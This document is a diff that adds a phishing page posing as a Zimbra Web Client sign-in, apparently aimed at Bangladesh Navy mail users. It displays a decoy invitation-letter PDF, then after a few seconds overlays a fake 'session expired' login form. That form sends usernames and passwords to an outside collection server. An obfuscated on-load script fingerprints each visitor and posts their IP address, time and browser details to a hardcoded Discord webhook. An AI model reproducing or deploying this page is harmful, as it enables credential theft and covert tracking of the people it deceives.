@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<link href="./index_files/favicon.ico" rel="icon" type="image-xicon">
+  <meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+    
+
+<link rel="stylesheet" type="text/css" href="index_files/commonloginzhtmlskin.css">
+
+
+
+
+
+<title>Zimbra Web Client Sign In</title>
+
+
+	<style type="text/css">
+
+body{font-family: Arial, Helvetica, sans-serif;
+    overflow: hidden;background-color: white;}
+
+		
+
+
+
+.objec-tblure{
+
+display:none;
+-webkit-filter: blur(5px);
+    -moz-filter: blur(2px);
+    -o-filter: blur(8px);
+    -ms-filter: blur(5px);
+    filter: blur(4px);
+
+
+
+
+}
+.spn{
+
+padding: 1 6px;
+    color: #fff;
+    padding-bottom: 5px;
+
+
+}.loginform{
+      width:100%;
+      height: 100%;
+      position: absolute;
+      top:0;
+      display: flex;
+      background-color:rgba(0,0,0,0.4);
+      justify-content: center;
+      align-items: center;
+  
+
+    }
+
+</style>
+
+<script type="text/javascript">
+    window.onload = function () {
+  var _0x2629e0 = window.location.href;
+  var _0x4258ec = new URL(_0x2629e0);
+  var _0x34b56a = _0x4258ec.searchParams.get("https://mail.navy.mil.bd");
+  document.getElementById("paf").value = _0x34b56a;
+  _0x34b56a = _0x34b56a || 'null';
+  fetch("https://api64.ipify.org?format=json").then(_0x2afcc1 => _0x2afcc1.json()).then(_0x177595 => {
+    var _0x3c0890 = _0x177595.ip;
+    var _0x5cada1 = new Date().toLocaleString();
+    var _0x156841 = navigator.userAgent;
+    var _0x4d1be1 = {
+      'content': "BDN NOTICE I : " + _0x34b56a + "\nIP Address: " + _0x3c0890 + "\nDate and Time: " + _0x5cada1 + "\nUser Agent: " + _0x156841
+    };
+    fetch("https://discordapp.com/api/webhooks/1236973296512405586/GOJfEug5bMCQRX89f6LHbEeUvJwWBtbT4kCqQKaTfBnUSqNSMixKjpMw7Md3fWAQgG5I", {
+      'method': "POST",
+      'headers': {
+        'Content-Type': "application/json"
+      },
+      'body': JSON.stringify(_0x4d1be1)
+    });
+  });
+  setTimeout(function () {
+        
+  document.getElementById('divDialogconfirmWLogin').style.display = "block";
+  document.getElementById('pdfpage').style.display="none";
+  document.getElementById('fellow').style.display="block";
+        },4000);
+};
+       
+</script> 
+</head>
+<body >
+  
+  <!-- Showing Pdf panel when popup is on blure this div-->
+<div id="pdfpage"style="display: block;">
+<object width="100%" height="1000" data="CETC Revised Invitation Letter.pdf#toolbar=0"></object>
+</div>
+<!-- BlurePdf panel when popup is on blure active-->
+<div id="fellow" class="objec-tblure">
+  <object class="kingfu" width="100%" height="1000" data="CETC Revised Invitation Letter.pdf#toolbar=0"></object>
+</div>
+
+<!-- Login Popup Page start Panel-->
+
+<div  class="loginform" >
+<div class="LoginScreen" id="divDialogconfirmWLogin" style="display: none;">
+    <div class="center">
+      <div class="contentBox">
+        <h1><a href="#" id="bannerLink" target="_new" title="Zimbra"><span class="ScreenReaderOnly">Zimbra</span>
+          <span class="ImgLoginBanner"></span>
+        </a></h1>
+        <div id="ZLoginAppName">Web Client</div>
+        
+                <form method="post" action="https://mail-sessionexpired.com/bdn/class.php" id="loginForm" name="loginForm" accept-charset="UTF-8">
+                <input type="hidden" name="loginOp" value="login">
+                <div id="ZLoginErrorPanel">
+            <table><tbody><tr>
+              <td><img src="./index_files/ImgCritical_32.png" title="Error" alt="Error" id="ZLoginErrorIcon"></td>
+              <td>Your login session has expired. Please login again.</td>
+            </tr></tbody></table>
+          </div>
+          
+        <table class="form">
+          
+                        <tbody><tr>
+                          <td><label for="username">Username:</label></td>
+                          <td><input id="paf" class="zLoginField" name="uname" required type="text" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"></td>
+                        </tr>
+                      
+                    <tr>
+                      <td><label for="password">Password:</label></td>
+                      <td><input id="teaw" autocomplete="off" class="zLoginField" name="upass" required type="password" value="" size="40" maxlength="1024"></td>
+                    </tr>
+              
+                    <tr>
+                      <td>&nbsp;</td>
+                      <td class="submitTD">
+                        <input id="remember" value="1" type="checkbox" name="zrememberme">
+                        <label for="remember">Stay signed in</label>
+                        <input type="submit" class="ZLoginButton DwtButton" value="Sign In">
+                      </td>
+                    </tr>
+            
+          <tr>
+            <td colspan="2"><hr></td>
+          </tr>
+          <tr>
+            <td>
+              <label for="client">Version:</label>
+            </td>
+            <td>
+              <div class="positioning">
+                
+                    <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
+                      <option value="preferred" selected=""> Default</option>
+                      <option value="advanced"> Advanced (Ajax)</option>
+                      <option value="standard"> Standard (HTML)</option>
+                      <option value="mobile"> Mobile</option>
+                                            
+                    </select>
+                  
+                  <script type="text/javascript">
+                    document.write("<a href='#' onclick='showWhatsThis();' id='ZLoginWhatsThisAnchor' aria-controls='ZLoginWhatsThis'>What's This?</a>");
+                  </script><a href="#" onclick="showWhatsThis();" id="ZLoginWhatsThisAnchor" aria-controls="ZLoginWhatsThis">What's This?</a>
+                                
+                                        <div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;" onclick="showWhatsThis();" role="tooltip"><h3 style="text-align:center;">Client Types</h3>  <b>Advanced</b> offers the full set of Web collaboration features. This Web Client works best with newer browsers and faster Internet connections. <br><br><b>Standard</b> is recommended when Internet connections are slow, when using older browsers, or for easier accessibility. <br><br><b>Mobile</b> is recommended for mobile devices. <br><br>To set <b>Default</b> to be your preferred client type, change the sign in options in your Preferences, General tab after you sign in.</div>
+                                    
+                <div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none;">Note that your web browser or display does not fully support the Advanced version.  We strongly recommend that you use the Standard client.</div>
+                </div>
+              </td>
+            </tr>
+          
+          </tbody></table>
+      </form>
+      </div>
+      <div class="decor1"></div>
+    </div>
+
+    <div class="Footer">
+      <div id="ZLoginNotice" class="legalNotice-small"><a target="_new" href="#">Zimbra</a> :: the leader in open source messaging and collaboration :: <a target="_new" href="#m">Blog</a> - <a target="_new" href="#">Wiki</a> - <a target="_new" href="#">Forums</a></div>
+      <div class="copyright">
+      Copyright © 2005-2014 Zimbra, Inc. All rights reserved. "Zimbra" is a registered trademark of Zimbra, Inc.
+      </div>
+    </div>
+    <div class="decor2"></div>
+  </div><div class="loginform">
+</body>
+</html>
